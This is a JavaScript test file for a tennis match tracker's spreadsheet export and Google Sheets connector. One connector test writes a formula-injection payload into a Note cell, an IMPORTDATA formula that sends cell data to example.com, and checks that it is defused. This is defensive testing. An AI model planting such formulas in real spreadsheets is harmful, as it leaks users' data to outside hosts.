  const rels = text('xl/_rels/workbook.xml.rels');
  assert.match(rels, /Id="rId6"[^>]*relationships\/styles" Target="styles.xml"/);
  const ct = text('[Content_Types].xml');
  assert.equal(ct.match(/worksheet\+xml/g).length, 5);

  const styles = text('xl/styles.xml');
  assert.match(styles, /<cellXfs count="14">/);
  assert.equal(styles.match(/<xf numFmtId="\d+" fontId="\d+" fillId="\d+" borderId="\d+" xfId="0"/g).length, 14, 'the default plus one per style');
  for (const c of ['FF5E4A1F', 'FFF3E8CC', 'FFDDF5E3', 'FFFBE0E0']) assert.ok(styles.includes(c), c);
  assert.ok(styles.includes('formatCode="0.0"'));

  const points1 = text('xl/worksheets/sheet2.xml');
  assert.match(points1, /<pane xSplit="1" ySplit="1" topLeftCell="B2" activePane="bottomRight" state="frozen"\/>/);
  assert.match(points1, new RegExp(`<autoFilter ref="A1:V${points.length + 1}"/>`), 'the filter covers the data rows');
  assert.match(points1, /<cols><col min="1" max="1" width="6" customWidth="1"\/>/);
  assert.match(points1, /<c r="L2"[^>]* t="inlineStr"><is><t>/);
  const sheet1 = text('xl/worksheets/sheet1.xml');
  assert.match(sheet1, /<mergeCells count="2"><mergeCell ref="A1:C1"\/><mergeCell ref="A2:C2"\/><\/mergeCells>/);
  assert.ok(sheet1.includes('Geneva &amp; Friends &lt;test&gt; &quot;quoted&quot;'));
  assert.ok(sheet1.includes('José &quot;J&quot; O\'Brien'));
  assert.match(sheet1, /<sheetView workbookViewId="0" tabSelected="1"><pane ySplit="\d+" topLeftCell="A\d+" activePane="bottomLeft" state="frozen"\/>/);
  assert.match(text('xl/worksheets/sheet3.xml'), /<autoFilter ref="A1:Q\d+"\/>/);
});

test('buildXlsx: cell types, styles, escaping, sheet names', () => {
  const bytes = T.buildXlsx([
    {
      name: 'a[b]:c*d?e/f\\g and a name that is far too long to fit',
      rows: [
        ['text', 12, 3.5, true, false, null, undefined, '', { v: 7, s: 'int' }, { v: 'x', s: 'good' }, { v: null, s: 'bad' }, { v: 0.25, s: 'pct' }, NaN, Infinity],
        ['<&>"\'', 'ctrl\u0001\u0008chars\u000b\u001f', 'tab\there', 'line\r\nbreak\rlone', ' padded ', '🎾 \ud800 lone', 'x'.repeat(40000)],
        [],
        ['after an empty row'],
      ],
      cols: [10, 0, 22.5],
      freeze: { cols: 2 },
    },
    { name: 'Sheet', rows: [['b']], freeze: { rows: 2 }, merges: ['A1:B1'], autoFilter: 'A2:C2' },
    { name: 'sheet', rows: [] },
    { name: "'quoted'", rows: [] },
    { name: '', rows: [] },
    { name: 'Sheet', rows: [] },
  ]);
  const zip = readZip(Buffer.from(bytes));
  const text = (n) => zip.get(n).toString('utf8');
  for (const n of zip.keys()) assertWellFormed(n, text(n));
  const wb = text('xl/workbook.xml');
  const names = [...wb.matchAll(/<sheet name="([^"]*)"/g)].map((m) => m[1]);
  assert.equal(names.length, 6);
  assert.equal(new Set(names.map((n) => n.toLowerCase())).size, 6, 'unique ignoring case');
  assert.ok(names.every((n) => n.length <= 31 && !/[\[\]:*?/\\]/.test(n)), names.join('|'));
  assert.equal(names[0], 'abcdefg and a name that is far');
  assert.deepEqual(names.slice(1), ['Sheet', 'sheet (2)', 'quoted', 'Sheet5', 'Sheet (3)']);
  assert.ok(!wb.includes('definedName name="_xlnm._FilterDatabase" localSheetId="0"'));
  assert.match(wb, /localSheetId="1" hidden="1">'Sheet'!\$A\$2:\$C\$2<\/definedName>/);

  const s = text('xl/worksheets/sheet1.xml');
  assert.ok(s.includes('<c r="A1" t="inlineStr"><is><t>text</t></is></c>'));
  assert.ok(s.includes('<c r="B1"><v>12</v></c>'));
  assert.ok(s.includes('<c r="C1"><v>3.5</v></c>'));
  assert.ok(s.includes('<c r="D1" t="b"><v>1</v></c>') && s.includes('<c r="E1" t="b"><v>0</v></c>'));
  assert.ok(!s.includes('r="F1"') && !s.includes('r="G1"') && !s.includes('r="H1"'), 'null, undefined and empty strings are skipped');
  assert.ok(s.includes('<c r="I1" s="5"><v>7</v></c>'), 'int is style 5');
  assert.ok(s.includes('<c r="J1" s="9" t="inlineStr"><is><t>x</t></is></c>'), 'good is style 9');
  assert.ok(s.includes('<c r="K1" s="10"/>'), 'a styled blank');
  assert.ok(s.includes('<c r="L1" s="7"><v>0.25</v></c>'));
  assert.ok(!s.includes('r="M1"') && !s.includes('r="N1"'), 'NaN and Infinity are skipped');
  assert.ok(s.includes("&lt;&amp;&gt;&quot;'"));
  assert.ok(s.includes('<t>ctrlchars</t>'), 'control characters are stripped');
  assert.ok(s.includes('<t xml:space="preserve">tab\there</t>'));
  assert.ok(s.includes('<t xml:space="preserve">line\nbreak\nlone</t>'), 'CRLF and CR become LF');
  assert.ok(s.includes('<t xml:space="preserve"> padded </t>'));
  assert.ok(s.includes('<t>🎾  lone</t>'), 'emoji kept, lone surrogate dropped');
  assert.ok(s.includes('<row r="4"><c r="A4"'), 'row numbers follow the input, an empty row is skipped');
  assert.equal(s.match(/<c r="G2" t="inlineStr"><is><t>(x+)<\/t>/)[1].length, 32767, 'a cell holds at most 32767 characters');
  assert.match(s, /<pane xSplit="2" topLeftCell="C1" activePane="topRight" state="frozen"\/><selection pane="topRight" activeCell="C1" sqref="C1"\/>/);
  assert.match(s, /<cols><col min="1" max="1" width="10" customWidth="1"\/><col min="2" max="2" width="10" customWidth="1"\/><col min="3" max="3" width="22.5" customWidth="1"\/><\/cols>/);
  assert.match(s, /<dimension ref="A1:L4"\/>/);
  const s2 = text('xl/worksheets/sheet2.xml');
  assert.match(s2, /<autoFilter ref="A2:C2"\/><mergeCells count="1"><mergeCell ref="A1:B1"\/><\/mergeCells>/, 'filter before merges, as the schema wants');
  assert.match(s2, /<pane ySplit="2" topLeftCell="A3" activePane="bottomLeft" state="frozen"\/>/);
  assert.match(text('xl/worksheets/sheet3.xml'), /<dimension ref="A1"\/><sheetViews>/);
  // no sheets at all still gives a workbook
  assert.equal(readZip(Buffer.from(T.buildXlsx([]))).size, 8);
});

test('toCSV and toTSV', () => {
  const rows = [['a', 'b,c', 'd"e', 'f\ng', 'h\r\ni', 1.5, null, undefined, true, false, { v: 'x', s: 'bold' }, { v: 3 }, '', 'tab\tin']];
  assert.equal(T.toCSV(rows), 'a,"b,c","d""e","f\ng","h\r\ni",1.5,,,TRUE,FALSE,x,3,,tab\tin');
  assert.equal(T.toCSV([['a', 'b'], [1, 2]]), 'a,b\r\n1,2');
  assert.equal(T.toCSV([]), '');
  assert.equal(T.toCSV([['', '']]), ',');
  assert.equal(T.toCSV([[NaN, Infinity, 0, -1.5]]), ',,0,-1.5');
  assert.equal(T.toTSV([['a\tb', 'c\r\nd', 'e\nf', 'g\rh', 1, null, { v: 'x' }], ['z']]), 'a b\tc d\te f\tg h\t1\t\tx\nz');
  assert.equal(T.toTSV([]), '');
  // text that would run as a formula in Excel or Sheets is defused, numbers and '-' are left alone
  assert.equal(T.toCSV([['=SUM(A1)', '+1', '@x', '-', '-x', 'ok', -5, '7/12 (58%)']]), "'=SUM(A1),'+1,'@x,-,'-x,ok,-5,7/12 (58%)");
  assert.equal(T.toTSV([['=1+1', 'fine']]), "'=1+1\tfine");
  // the sheet layout survives a round trip through CSV
  const csv = T.toCSV(T.pointLogRows(FIX, NAMES));
  assert.equal(csv.split('\r\n').length, FIX.length + 1);
  assert.ok(csv.startsWith('#,Set,Game,Score,Server,Side,1st In,Serve #,Serve mph,Placement,Rally,Outcome,'));
  assert.deepEqual(T.plainRows([['a', { v: 1, s: 'int' }, { v: null }, null, undefined, NaN, true, { v: 'x' }]]), [['a', 1, '', '', '', '', true, 'x']]);
});

test('bytesToBase64 and utf8Bytes agree with Buffer', () => {
  const rand = rng(99);
  for (let len = 0; len <= 70; len++) {
    const bytes = Uint8Array.from({ length: len }, () => Math.floor(rand() * 256));
    assert.equal(T.bytesToBase64(bytes), Buffer.from(bytes).toString('base64'), `${len} bytes`);
  }
  const big = Uint8Array.from({ length: 100001 }, () => Math.floor(rand() * 256));
  assert.equal(T.bytesToBase64(big), Buffer.from(big).toString('base64'));
  assert.equal(T.bytesToBase64([72, 105]), 'SGk=');
  const xlsx = T.buildXlsx(T.matchWorkbook({ title: 't', date: '2026-10-02', names: NAMES }, FIX, []));
  assert.equal(T.bytesToBase64(xlsx), Buffer.from(xlsx).toString('base64'));

  for (const s of ['', 'plain ascii', 'Knee min° — Hip-shoulder°', 'José Ñandú', '日本語', 'tennis 🎾 ball', '\ud800 lone', 'x\udc00y', '😀\ud83d', '\u0000\u007f\u0080\u07ff\u0800\uffff', '𝄞'.repeat(50)]) {
    assert.deepEqual(Buffer.from(T.utf8Bytes(s)), Buffer.from(s, 'utf8'), JSON.stringify(s));
  }
});

// ======================================================================================
// the Google Sheets connector (Code.gs), run against an in-memory Apps Script
// ======================================================================================

const CODE_GS = readFileSync(new URL('sheets-connector/Code.gs', ROOT), 'utf8').replace(/\r\n/g, '\n');

/** Just enough of SpreadsheetApp, LockService, PropertiesService, ContentService and Session. */
function makeGas() {
  const book = new Map();
  const props = new Map();
  const log = { locks: 0, unlocks: 0, created: [], bandings: 0, rules: 0 };
  const chain = (o) => {
    const p = new Proxy(o, { get: (t, k) => (k in t ? t[k] : typeof k === 'symbol' ? undefined : () => p) });
    return p;
  };
  class Sheet {
    constructor(name) {
      this.name = name;
      this.cells = new Map();
      this.maxRows = 1000;
      this.maxCols = 26;
      this.bands = [];
      this.formats = [];
      this.frozen = [0, 0];
      this.widths = {};
    }
    cell(r, c) {
      return this.cells.has(r + ',' + c) ? this.cells.get(r + ',' + c) : '';
    }
    lastRow() {
      let m = 0;
      for (const [k, v] of this.cells) if (v !== '') m = Math.max(m, Number(k.split(',')[0]));
      return m;
    }
    grid() {
      const rows = this.lastRow();
      const out = [];
      for (let r = 1; r <= rows; r++) {
        const row = [];
        for (let c = 1; c <= this.maxCols; c++) row.push(this.cell(r, c));
        while (row.length && row[row.length - 1] === '') row.pop();
        out.push(row);
      }
      return out;
    }
  }
  const sheetApi = (s) => {
    const self = chain({
      setName: (n) => { s.name = n; return self; },
      getName: () => s.name,
      getLastRow: () => s.lastRow(),
      getMaxRows: () => s.maxRows,
      getMaxColumns: () => s.maxCols,
      insertRowsAfter: (_, n) => { s.maxRows += n; },
      insertColumnsAfter: (_, n) => { s.maxCols += n; },
      getBandings: () => s.bands,
      setFrozenRows: (n) => { s.frozen[0] = n; return self; },
      setFrozenColumns: (n) => { s.frozen[1] = n; return self; },
      setColumnWidth: (c, w) => { s.widths[c] = w; return self; },
      setConditionalFormatRules: (r) => { log.rules = r.length; return self; },
      clear: () => { s.cells.clear(); s.bands = []; return self; },
      getRange: (r, c, nr = 1, nc = 1) => {
        assert.ok(r >= 1 && c >= 1 && nr >= 1 && nc >= 1, `bad range ${r},${c},${nr},${nc}`);
        if (r + nr - 1 > s.maxRows || c + nc - 1 > s.maxCols) throw new Error(`Range ${r},${c},${nr},${nc} is outside the grid`);
        const range = chain({
          getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => s.cell(r + i, c + j))),
          setValues: (v) => {
            assert.equal(v.length, nr, 'setValues rows');
            v.forEach((row, i) => { assert.equal(row.length, nc, 'setValues columns'); row.forEach((x, j) => s.cells.set(r + i + ',' + (c + j), x)); });
            return range;
          },
          setValue: (x) => { s.cells.set(r + ',' + c, x); return range; },
          clearContent: () => { for (let i = 0; i < nr; i++) for (let j = 0; j < nc; j++) s.cells.delete(r + i + ',' + (c + j)); return range; },
          setNumberFormat: (f) => { s.formats.push([r, c, nr, nc, f]); return range; },
          applyRowBanding: () => {
            if (s.bands.length) throw new Error('This range already has banding');
            s.bands.push(1);
            log.bandings++;
            return chain({});
          },
        });
        return range;
      },
      getRangeList: (l) => chain({}),
    });
    return self;
  };
  const wrap = (s) => (s.api ??= sheetApi(s));
  const ssApi = (id, name) => {
    const sheets = [new Sheet('Sheet1')];
    const ss = chain({
      sheets, id, name,
      getId: () => id,
      getUrl: () => 'https://docs.google.com/spreadsheets/d/' + id + '/edit',
      getSheets: () => sheets.map(wrap),
      getSheetByName: (n) => { const s = sheets.find((x) => x.name === n); return s ? wrap(s) : null; },
      insertSheet: (n, i) => { const s = new Sheet(n); sheets.splice(i === undefined ? sheets.length : i, 0, s); return wrap(s); },
      setActiveSheet: () => ss,
    });
    return ss;
  };
  const env = {
    console,
    SpreadsheetApp: {
      create: (name) => { const id = 'sheet' + (book.size + 1); const ss = ssApi(id, name); book.set(id, ss); log.created.push(name); return ss; },
      openById: (id) => { if (!book.has(id)) throw new Error('No spreadsheet with id ' + id); return book.get(id); },
      newConditionalFormatRule: () => chain({ build: () => ({}) }),
      BandingTheme: { LIGHT_GREY: 'LIGHT_GREY' },
    },
    LockService: { getScriptLock: () => ({ waitLock: () => { log.locks++; }, releaseLock: () => { log.unlocks++; } }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (props.has(k) ? props.get(k) : null), setProperty: (k, v) => { props.set(k, v); } }) },
    ContentService: { MimeType: { JSON: 'application/json' }, createTextOutput: (s) => ({ getContent: () => s, setMimeType(m) { this.mime = m; return this; } }) },
    Session: { getEffectiveUser: () => ({ getEmail: () => 'coach@example.com' }) },
  };
  return { env, book, props, log };
}

function loadConnector(source) {
  const gas = makeGas();
  const ctx = vm.createContext(gas.env);
  vm.runInContext(source, ctx, { filename: 'Code.gs' });
  const post = (body) => {
    const out = ctx.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } });
    return { ...JSON.parse(out.getContent()), _mime: out.mime };
  };
  return { ...gas, ctx, post, get: (name) => JSON.parse(JSON.stringify(vm.runInContext(name, ctx))) };
}

test('connector: Code.gs parses and its header is the Points header', () => {
  assert.doesNotThrow(() => new vm.Script(CODE_GS, { filename: 'Code.gs' }));
  assert.match(CODE_GS, /^const TOKEN = 'CHANGE-ME';$/m);
  const c = loadConnector(CODE_GS);
  assert.deepEqual(c.get('POINT_HEADER'), T.pointLogRows([], NAMES)[0]);
  assert.equal(c.get('POINT_WIDTHS').length, c.get('POINT_HEADER').length);
  assert.deepEqual(JSON.parse(c.ctx.doGet().getContent()), { ok: true, app: 'Geneva Tennis connector', version: c.get('VERSION'), note: 'POST JSON to this URL; see README.md.' });
  // the copy shipped inside the app is Code.gs
  assert.equal(T.CONNECTOR_SOURCE, CODE_GS);
  assert.equal(T.CONNECTOR_VERSION, Number(/^const VERSION = (\d+);/m.exec(CODE_GS)[1]));
  assert.ok(Number.isInteger(T.CONNECTOR_VERSION) && T.CONNECTOR_VERSION >= 1);
  assert.match(readFileSync(new URL('src/tennis/connectorSource.d.ts', ROOT), 'utf8'), /CONNECTOR_SOURCE: string;[\s\S]*CONNECTOR_VERSION: number;/);
});

test('connector: token, ping and errors', () => {
  const open = loadConnector(CODE_GS);
  assert.deepEqual(open.post({ token: 'nope', action: 'ping' }), { ok: false, error: 'bad token', _mime: 'application/json' });
  const unset = open.post({ token: 'CHANGE-ME', action: 'ping' });
  assert.equal(unset.ok, false);
  assert.match(unset.error, /TOKEN/);

  const c = loadConnector(CODE_GS.replace("const TOKEN = 'CHANGE-ME';", "const TOKEN = 'secret';"));
  assert.equal(c.post({ action: 'ping' }).error, 'bad token');
  assert.equal(c.post({ token: 'CHANGE-ME', action: 'ping' }).error, 'bad token');
  assert.deepEqual(c.post({ token: 'secret', action: 'ping' }), { ok: true, owner: 'coach@example.com', version: T.CONNECTOR_VERSION, _mime: 'application/json' });
  assert.equal(c.post({ token: 'secret', action: 'explode' }).error, 'unknown action');
  assert.equal(c.post('not json').error, 'bad json');
  assert.equal(c.post('null').error, 'bad token');
  assert.equal(c.ctx.doPost({}).getContent().includes('bad token'), true);
  assert.equal(c.book.size, 0, 'nothing was created');
});

test('connector: createMatch and pushPoints upsert by point number', () => {
  const c = loadConnector(CODE_GS.replace("const TOKEN = 'CHANGE-ME';", "const TOKEN = 'secret';"));
  const header = T.pointLogRows([], NAMES)[0];
  const sim = simulate(FMT.college, 21, true).points.slice(0, 12);
  const rowsOf = (pts) => T.plainRows(T.pointLogRows(pts, NAMES).slice(1));
  const match = { id: 'm1', title: 'Geneva at Westminster', date: '2026-10-02', names: NAMES };

  const made = c.post({ token: 'secret', action: 'createMatch', match });
  assert.equal(made.ok, true);
  assert.match(made.url, /^https:\/\/docs\.google\.com\/spreadsheets\/d\/sheet1/);
  assert.equal(c.log.created[0], 'Geneva Tennis — Geneva at Westminster (2026-10-02)');
  const ss = c.book.get(made.sheetId);
  assert.deepEqual(ss.getSheets().map((s) => s.getName()), ['Points', 'Summary', 'About']);
  assert.equal(c.props.get('match:m1'), made.sheetId);
  const pts = ss.getSheetByName('Points');
  assert.deepEqual(pts.getRange(1, 1, 1, header.length).getValues()[0], header);
  assert.equal(c.log.bandings, 1);
  assert.equal(c.log.rules, 5, 'five outcome colour rules');
  const retry = c.post({ token: 'secret', action: 'createMatch', match });
  assert.deepEqual([retry.ok, retry.sheetId, retry.url], [true, made.sheetId, made.url], 'asking again returns the same sheet');
  assert.equal(c.book.size, 1, 'a retry does not make a duplicate');
  assert.equal(c.log.locks, c.log.unlocks);

  // first batch, by remembered id only (no sheetId in the request)
  const out1 = c.post({ token: 'secret', action: 'pushPoints', match: { id: 'm1', title: match.title }, header, rows: rowsOf(sim.slice(0, 3)), summary: [] });
  assert.deepEqual([out1.ok, out1.written, out1.sheetId, out1.url], [true, 3, made.sheetId, made.url]);
  assert.equal(c.book.size, 1, 'the remembered sheet was reused');
  let g = c.book.get(made.sheetId).sheets.find((s) => s.name === 'Points').grid();
  assert.equal(g.length, 4);
  assert.deepEqual(g.slice(1).map((r) => r[0]), [1, 2, 3]);
  assert.equal(c.log.locks, c.log.unlocks, 'the lock is always released');
  assert.ok(c.log.locks >= 1);

  // second batch: point 3 corrected, 4-6 new; sent twice, with an older point mixed in
  const fixed = { ...sim[2], outcome: 'ue', endedBy: 0, winner: 1, note: 'corrected' };
  const batch = rowsOf([fixed, ...sim.slice(3, 6)]);
  for (let i = 0; i < 2; i++) c.post({ token: 'secret', action: 'pushPoints', match: { id: 'm1', sheetId: made.sheetId }, header, rows: batch.slice().reverse(), summary: [] });
  g = ss.sheets.find((s) => s.name === 'Points').grid();
  assert.deepEqual(g.slice(1).map((r) => r[0]), [1, 2, 3, 4, 5, 6], 'one row per point, in order');
  assert.equal(g[3][header.indexOf('Outcome')], 'Unforced error');
  assert.equal(g[3][header.indexOf('Note')], 'corrected');
  assert.deepEqual(g[1].slice(0, 4), rowsOf(sim.slice(0, 1))[0].slice(0, 4));
  assert.equal(g[1][header.indexOf('Score')], '0-0', 'scores stay text');
  assert.ok(ss.sheets.find((s) => s.name === 'Points').formats.some((f) => f[1] === header.indexOf('Score') + 1 && f[4] === '@'), 'the Score column is plain text');
  assert.equal(c.log.bandings, 1, 'banding is applied once');

  // removed points leave no row behind
  c.post({ token: 'secret', action: 'pushPoints', match: { id: 'm1' }, header, rows: [], removed: [2, 6], summary: [] });
  g = ss.sheets.find((s) => s.name === 'Points').grid();
  assert.deepEqual(g.slice(1).map((r) => r[0]), [1, 3, 4, 5]);
  assert.equal(g.length, 5, 'the trailing rows are cleared');

  // the summary table replaces the Summary tab and the header row is first
  const table = T.plainRows(T.summaryRows(T.computeStats(sim), NAMES));
  const out2 = c.post({ token: 'secret', action: 'pushPoints', match: { id: 'm1' }, header, rows: [], summary: table });
  assert.equal(out2.ok, true);
  const sg = ss.sheets.find((s) => s.name === 'Summary').grid();
  assert.deepEqual(sg[0], ['Stat', 'Josiah', 'Opponent']);
  assert.equal(sg.length, table.length);
  assert.deepEqual(sg[1], ['Serve']);
  c.post({ token: 'secret', action: 'pushPoints', match: { id: 'm1' }, header, rows: [], summary: table.slice(0, 3) });
  assert.equal(ss.sheets.find((s) => s.name === 'Summary').grid().length, 3, 'the old table is cleared first');

  // text cannot run as a formula, and the number columns only hold numbers
  const evil = rowsOf([sim[6]])[0].slice();
  evil[header.indexOf('Note')] = '=IMPORTDATA("http://example.com/?"&A2)';
  evil[header.indexOf('Server')] = '-5+2';
  evil[header.indexOf('Rally')] = '=1+1';
  evil[header.indexOf('Secs')] = Infinity;
  c.post({ token: 'secret', action: 'pushPoints', match: { id: 'm1' }, header, rows: [evil], summary: [] });
  g = ss.sheets.find((s) => s.name === 'Points').grid();
  const row7 = g.find((r) => r[0] === 7);
  assert.equal(row7[header.indexOf('Note')], ' =IMPORTDATA("http://example.com/?"&A2)');
  assert.equal(row7[header.indexOf('Server')], ' -5+2');
  assert.equal(row7[header.indexOf('Rally')] ?? '', '');

  // a sheet that no longer exists is replaced by a fresh one
  const lost = c.post({ token: 'secret', action: 'pushPoints', match: { id: 'm1', title: 'again', date: '2026-10-03', sheetId: 'gone' }, header, rows: rowsOf(sim.slice(0, 2)), summary: [] });
  assert.equal(lost.ok, true);
  assert.notEqual(lost.sheetId, made.sheetId);
  assert.equal(c.props.get('match:m1'), lost.sheetId);
  assert.equal(c.book.size, 2);
  // an unknown match with no sheet makes one too, and a too-short header row still lines up
  const fresh = c.post({ token: 'secret', action: 'pushPoints', match: { id: 'm2', title: 'Other' }, rows: [[1, 1, 1, '0-0']], summary: [] });
  assert.equal(fresh.ok, true);
  assert.deepEqual(c.book.get(fresh.sheetId).sheets.find((s) => s.name === 'Points').grid()[1], [1, 1, 1, '0-0']);
});

// ======================================================================================
// the tracker build inlines these files into ONE script
// ======================================================================================

const INLINED = ['score', 'stats', 'trends', 'xlsx', 'sheets'];

test('inlining rules: no export default or renames, single-line imports, unique top-level names, no forbidden APIs', () => {
  const files = readdirSync(SRC).filter((f) => f.endsWith('.js') && f !== 'index.js');
  const declared = new Map();
  for (const f of files) {
    const text = readFileSync(new URL(f, SRC), 'utf8');
    assert.ok(!/^export\s+default\b/m.test(text), `${f}: export default`);
    assert.ok(!/^export\s*[{*]/m.test(text), `${f}: export { } or export *`);
    for (const line of text.split('\n').filter((l) => /^import\b/.test(l))) {
      assert.match(line, /^import \{ [\w$, ]+ \} from '\.\/[\w]+\.js';$/, `${f}: ${line}`);
      assert.ok(files.includes(line.match(/'\.\/([\w]+\.js)'/)[1]), `${f}: imports a file outside src/tennis`);
    }
    assert.ok(!/\bimport\s*\(|\brequire\s*\(/.test(text), `${f}: dynamic import or require`);
    for (const m of text.matchAll(/^(?:export\s+)?(?:async\s+)?(?:function\*?\s+|class\s+|const\s+|let\s+|var\s+)([A-Za-z_$][\w$]*)/gm)) {
      const prev = declared.get(m[1]);
      assert.ok(!prev, `${m[1]} is declared in both ${prev} and ${f}`);
      declared.set(m[1], f);
    }
    if (!INLINED.includes(f.replace('.js', ''))) continue;
    assert.match(text, /^[\t\r\n -~]*$/, `${f}: keep inlined sources pure ASCII, the tracker page may have no charset`);
    // API check on code lines (comments may mention what we avoid)
    const code = text.split('\n').filter((l) => !/^\s*(\/\/|\/\*|\*)/.test(l)).join('\n');
    for (const bad of ['Intl', 'toLocaleString', 'TextEncoder', 'TextDecoder', 'Buffer', 'atob', 'btoa', 'structuredClone', 'document', 'window', 'localStorage', 'process', 'globalThis', 'setTimeout', 'fetch']) {
      assert.ok(!new RegExp(`\\b${bad}\\b`).test(code), `${f} uses ${bad}`);
    }
    assert.ok(!/[\s(,;]#[A-Za-z_]\w*\s*[=;(]/.test(code), `${f}: private class fields`);
  }
  for (const n of ['MatchScore', 'computeStats', 'detectTrends', 'buildXlsx', 'matchWorkbook', 'FORMATS']) assert.ok(declared.has(n), n);
  for (const n of declared.keys()) {
    if (/^_/.test(n)) assert.match(n, /^_(sc|st|tr|xl|sh)_/, `${n}: private helpers carry a per-file prefix`);
  }
});

test('inlined into one function scope (as the tracker build does) it runs and agrees with the modules', () => {
  const strip = (t) => t.replace(/^export\s+/gm, '').replace(/^import .*$/gm, '');
  const code = INLINED.map((f) => strip(readFileSync(new URL(f + '.js', SRC), 'utf8'))).join('\n');
  // the tracker page runs it as a strict classic script, so evaluate it strictly
  const lib = new Function('"use strict";\n' + code + '; return {MatchScore, computeStats, detectTrends, buildXlsx, matchWorkbook, pointLogRows, toCSV};')();
  // also from a file in the OS temp directory, not in the repo
  const dir = mkdtempSync(join(tmpdir(), 'tennis-inline-'));
  writeFileSync(join(dir, 'inlined.js'), code);
  assert.doesNotThrow(() => new vm.Script(code, { filename: join(dir, 'inlined.js') }));
  rmSync(dir, { recursive: true, force: true });

  const { points, ms, near0 } = simulate(FMT.college, 3, true);
  const names = ['Ours', 'Theirs'];
  assert.equal(lib.MatchScore.replay(FMT.college, ms.firstServer, ms.history, near0).setsLabel(), ms.setsLabel());
  assert.deepEqual(lib.computeStats(points), T.computeStats(points));
  assert.deepEqual(lib.detectTrends(points, names), T.detectTrends(points, names));
  assert.deepEqual(lib.matchWorkbook({ title: 't', date: '2026-10-02', names }, points, []), T.matchWorkbook({ title: 't', date: '2026-10-02', names }, points, []));
  assert.equal(lib.toCSV(lib.pointLogRows(points, names)), T.toCSV(T.pointLogRows(points, names)));
  const x = lib.buildXlsx(lib.matchWorkbook({ title: 't', date: '2026-10-02', names }, points, []));
  assert.equal(readZip(Buffer.from(x)).size, 12);
});

test('index.js exports every name in index.d.ts', () => {
  const dts = readFileSync(new URL('index.d.ts', SRC), 'utf8');
  const wanted = [...dts.matchAll(/^export declare (?:function|const|class) (\w+)/gm)].map((m) => m[1]);
  assert.ok(wanted.length >= 12, wanted.join());
  for (const n of wanted) assert.ok(n in T, `index.js is missing ${n}`);
  for (const n of ['plainRows', 'utf8Bytes', 'gameGroups', 'CONNECTOR_SOURCE', 'CONNECTOR_VERSION']) assert.ok(n in T, n);
});
